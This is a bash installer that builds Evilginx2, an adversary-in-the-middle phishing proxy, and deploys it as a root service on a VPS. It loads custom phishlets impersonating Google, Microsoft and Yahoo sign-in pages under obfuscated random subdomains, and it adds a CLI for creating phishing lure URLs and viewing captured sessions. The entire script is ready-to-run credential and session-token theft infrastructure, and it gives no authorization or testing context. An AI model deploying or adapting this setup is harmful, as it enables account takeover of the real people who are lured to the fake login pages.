#!/bin/bash
# ============================================================================
# Evilginx HTTP-Only Setup - Uses Your Phishlets
# ============================================================================

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'

print_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════════════╗
    ║                    Evilginx HTTP-Only Setup                      ║
    ║              Uses Your Custom Phishlets                          ║
    ║                    Like Fpages - Simple & Clean                  ║
    ╚══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; exit 1; }

print_banner

# Get configuration
log "Please enter your configuration:"
read -p "  Domain (e.g., motarmo.click): " DOMAIN
read -p "  VPS IP Address: " VPS_IP
read -p "  HTTP Port (default 80): " HTTP_PORT
HTTP_PORT=${HTTP_PORT:-80}

if [[ -z "$DOMAIN" ]] || [[ -z "$VPS_IP" ]]; then
    error "Domain and VPS IP are required"
fi

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Check if phishlets exist
if [[ ! -d "$SCRIPT_DIR/phishlets" ]]; then
    error "phishlets/ directory not found! Place your phishlets in ./phishlets/"
fi

if [[ ! -f "$SCRIPT_DIR/phishlets/google.yaml" ]] || \
   [[ ! -f "$SCRIPT_DIR/phishlets/microsoft.yaml" ]] || \
   [[ ! -f "$SCRIPT_DIR/phishlets/yahoo.yaml" ]]; then
    error "Missing phishlet files in ./phishlets/ directory"
fi

log "Found your phishlets:"
ls -la "$SCRIPT_DIR/phishlets/"

# Install dependencies
log "Installing dependencies..."
apt-get update -y >/dev/null 2>&1
apt-get install -y git curl wget build-essential golang-go openssl jq dnsutils expect >/dev/null 2>&1

# Install Go if needed
if ! command -v go &>/dev/null; then
    log "Installing Go..."
    wget -q https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
    tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
    export PATH=$PATH:/usr/local/go/bin
    rm go1.22.0.linux-amd64.tar.gz
fi

# Build Evilginx
log "Building Evilginx from source..."
rm -rf /tmp/evilginx2
git clone https://github.com/kgretzky/evilginx2.git /tmp/evilginx2 2>/dev/null
cd /tmp/evilginx2
go build -buildvcs=false -o evilginx 2>/dev/null
cp evilginx /usr/local/bin/evilginx
chmod +x /usr/local/bin/evilginx

# Create directories
log "Creating directories..."
mkdir -p /opt/evilginx/{config,phishlets,certs,lures,logs}

# Generate random subdomain prefixes (obfuscated)
EP1="gw-$(openssl rand -hex 3)"
EP2="auth-$(openssl rand -hex 3)"
EP3="portal-$(openssl rand -hex 3)"

echo "$EP1" > /opt/evilginx/.ep1
echo "$EP2" > /opt/evilginx/.ep2
echo "$EP3" > /opt/evilginx/.ep3

WEBHOOK_SECRET=$(openssl rand -hex 16)

# Create HTTP-only config
log "Creating configuration..."
cat > /opt/evilginx/config/config.yaml << EOF
daemon: false
debug: false
domain: $DOMAIN
ipv4: $VPS_IP
http_port: $HTTP_PORT
https_port: 0
dns_port: 0
autocert: false
phishlets_path: /opt/evilginx/phishlets
cert_path: /opt/evilginx/certs
database: /opt/evilginx/evilginx.db
unauth_url: https://www.google.com
EOF

# Copy your phishlets to Evilginx directory
log "Copying your phishlets..."
cp "$SCRIPT_DIR/phishlets/google.yaml" /opt/evilginx/phishlets/
cp "$SCRIPT_DIR/phishlets/microsoft.yaml" /opt/evilginx/phishlets/
cp "$SCRIPT_DIR/phishlets/yahoo.yaml" /opt/evilginx/phishlets/

# Update placeholders in phishlets
log "Configuring phishlets with your domain..."
sed -i "s/{{.Domain}}/$DOMAIN/g" /opt/evilginx/phishlets/*.yaml
sed -i "s/{{.Endpoint1}}/$EP1/g" /opt/evilginx/phishlets/yahoo.yaml
sed -i "s/{{.Endpoint2}}/$EP2/g" /opt/evilginx/phishlets/microsoft.yaml
sed -i "s/{{.Endpoint3}}/$EP3/g" /opt/evilginx/phishlets/google.yaml
sed -i "s/{{.VpsIp}}/$VPS_IP/g" /opt/evilginx/phishlets/*.yaml
sed -i "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" /opt/evilginx/phishlets/*.yaml
sed -i "s/{{.AppPort}}/80/g" /opt/evilginx/phishlets/*.yaml

# Change HTTPS to HTTP in phishlets (for HTTP mode)
log "Converting HTTPS to HTTP in phishlets..."
sed -i 's|https://{{.Domain}}|http://{{.Domain}}|g' /opt/evilginx/phishlets/*.yaml
sed -i 's|https://accounts.google.com|http://{{.Endpoint3}}.{{.Domain}}|g' /opt/evilginx/phishlets/google.yaml
sed -i 's|https://login.microsoftonline.com|http://{{.Endpoint2}}.{{.Domain}}|g' /opt/evilginx/phishlets/microsoft.yaml
sed -i 's|https://login.yahoo.com|http://{{.Endpoint1}}.{{.Domain}}|g' /opt/evilginx/phishlets/yahoo.yaml

# Create systemd service
log "Creating systemd service..."
cat > /etc/systemd/system/evilginx.service << EOF
[Unit]
Description=Evilginx Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/evilginx
ExecStart=/usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable evilginx
systemctl start evilginx

# Create CLI tool
log "Creating CLI tool..."
cat > /usr/local/bin/evilginx-cli << 'CLIEOF'
#!/bin/bash
# Evilginx CLI - Interactive Command Tool

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

show_help() {
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}Evilginx Commands:${NC}"
    echo ""
    echo -e "${YELLOW}Service:${NC}"
    echo -e "  ${GREEN}restart${NC}        - Restart evilginx service"
    echo -e "  ${GREEN}status${NC}         - Show service status"
    echo -e "  ${GREEN}sessions${NC}       - Show captured sessions"
    echo -e "  ${GREEN}traffic${NC}        - Show traffic statistics"
    echo ""
    echo -e "${YELLOW}Phishlets:${NC}"
    echo -e "  ${GREEN}phishlets${NC}      - List all phishlets"
    echo -e "  ${GREEN}enable <name>${NC}  - Enable phishlet (google/microsoft/yahoo)"
    echo -e "  ${GREEN}disable <name>${NC} - Disable phishlet"
    echo ""
    echo -e "${YELLOW}Lures:${NC}"
    echo -e "  ${GREEN}lures create <name>${NC} - Create new phishing URL"
    echo -e "  ${GREEN}lures list${NC}          - List all lures"
    echo -e "  ${GREEN}lures url <id>${NC}      - Get URL for lure ID"
    echo ""
    echo -e "${YELLOW}Other:${NC}"
    echo -e "  ${GREEN}help${NC}            - Show this help"
    echo -e "  ${GREEN}exit${NC}            - Exit CLI"
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
}

restart() {
    sudo systemctl restart evilginx
    echo -e "${GREEN}[✓] Evilginx restarted${NC}"
}

status() {
    if systemctl is-active --quiet evilginx; then
        echo -e "${GREEN}[✓] Evilginx is RUNNING${NC}"
    else
        echo -e "${RED}[✗] Evilginx is STOPPED${NC}"
    fi
}

traffic() {
    echo -e "${BLUE}[*] Traffic Statistics:${NC}"
    if [[ -f "/opt/evilginx/evilginx.db" ]]; then
        TOTAL=$(sudo sqlite3 /opt/evilginx/evilginx.db "SELECT COUNT(*) FROM sessions;" 2>/dev/null || echo "0")
        echo -e "  ${GREEN}Total Visitors:${NC} $TOTAL"
    else
        echo "  No data yet"
    fi
}

sessions() {
    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets -sessions
}

phishlets() {
    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets -phishlets
}

enable_phishlet() {
    echo -e "${BLUE}[*] Enabling $1...${NC}"
    sudo systemctl stop evilginx
    sleep 1
    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets > /tmp/evilginx.out 2>&1 <<EOF
phishlets enable $1
exit
EOF
    sudo systemctl start evilginx
    echo -e "${GREEN}[✓] $1 enabled${NC}"
}

disable_phishlet() {
    echo -e "${BLUE}[*] Disabling $1...${NC}"
    sudo systemctl stop evilginx
    sleep 1
    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets > /tmp/evilginx.out 2>&1 <<EOF
phishlets disable $1
exit
EOF
    sudo systemctl start evilginx
    echo -e "${GREEN}[✓] $1 disabled${NC}"
}

create_lure() {
    echo -e "${BLUE}[*] Creating lure for $1...${NC}"
    sudo systemctl stop evilginx
    sleep 1
    output=$(sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets <<EOF
lures create $1
lures get-url 0
exit
EOF
)
    url=$(echo "$output" | grep -E "http://" | head -1)
    sudo systemctl start evilginx
    if [[ -n "$url" ]]; then
        echo -e "${GREEN}[✓] Lure created!${NC}"
        echo -e "${CYAN}URL: ${url}${NC}"
        echo "$url" >> /opt/evilginx/lures.txt
    else
        echo -e "${RED}[✗] Failed to create lure${NC}"
    fi
}

list_lures() {
    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets -lures
}

get_lure_url() {
    sudo /usr/local/bin/evilginx -c /opt/evilginx/config -p /opt/evilginx/phishlets <<EOF
lures get-url $1
exit
EOF
}

# Main loop
echo -e "${CYAN}Evilginx CLI - Type 'help' for commands${NC}"
echo ""

while true; do
    echo -n -e "${GREEN}evilginx> ${NC}"
    read -r cmd args

    case "$cmd" in
        "" ) continue ;;
        help) show_help ;;
        restart) restart ;;
        status) status ;;
        traffic) traffic ;;
        sessions) sessions ;;
        phishlets) phishlets ;;
        enable) enable_phishlet "$args" ;;
        disable) disable_phishlet "$args" ;;
        lures) 
            case "$args" in
                create*) create_lure "${args#create }" ;;
                list) list_lures ;;
                url*) get_lure_url "${args#url }" ;;
                *) echo "Usage: lures <create|list|url> [name|id]";;
            esac
            ;;
        exit) echo -e "${GREEN}Goodbye!${NC}"; exit 0 ;;
        *) echo -e "${RED}Unknown command. Type 'help'${NC}" ;;
    esac
    echo ""
done
CLIEOF

chmod +x /usr/local/bin/evilginx-cli

log "Installation complete!"
echo ""
echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}                    EVILGINX INSTALLED!                          ${NC}"
echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
echo ""
echo "Your subdomains:"
echo "  Yahoo: $EP1.$DOMAIN"
echo "  Microsoft: $EP2.$DOMAIN"
echo "  Google: $EP3.$DOMAIN"
echo ""
echo "Run 'evilginx-cli' to manage"
echo ""